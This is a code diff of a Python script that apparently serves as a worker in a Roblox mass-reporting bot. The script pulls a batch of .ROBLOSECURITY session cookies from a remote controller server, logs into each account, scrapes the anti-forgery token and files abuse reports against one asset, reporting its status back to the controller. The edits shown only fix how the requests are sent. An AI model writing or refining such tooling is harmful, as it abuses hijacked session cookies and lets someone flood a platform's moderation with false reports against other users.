@@ -14,13 +14,13 @@ def threaded(func):
     return wrapper
 
 def log(message):
-    requests.post(tunnel + "/log", {
+    requests.post(tunnel + "/log", json={
         "id": action_id,
         "message": message
     })
 
 def start_report(cookie):
-    url = f'https://www.roblox.com/abusereport/asset?id={asset_id}&redirecturl=%2fcatalog%2f{id}%2funnamed'
+    url = f'https://www.roblox.com/abusereport/asset?id={asset_id}&redirecturl=%2fcatalog%2f{asset_id}%2funnamed'
     session = requests.Session()
     session.cookies.update({'.ROBLOSECURITY': cookie})
     request_verification_token = re.search('<input name="__RequestVerificationToken" type="hidden" value="(.+)"', session.get(url).text).group(1)
@@ -50,7 +50,7 @@ def start_report(cookie):
 @threaded
 def pinger():
     while True:
-        requests.post(tunnel + "/ping", {
+        requests.post(tunnel + "/ping", json={
             "id" : action_id
         })
         time.sleep(3)
@@ -59,7 +59,7 @@ pinger()
 log("connected")
 
 
-cookies = requests.post(tunnel + "/get_cookie", {
+cookies = requests.post(tunnel + "/get_cookie", json={
     "id": action_id
 })
 print(cookies.content)
@@ -67,6 +67,6 @@ cookies = cookies.json()
 for cookie in cookies:
     start_report(cookie)
 
-requests.post(tunnel + "/done", {
+requests.post(tunnel + "/done", json={
     "id" : action_id
 })
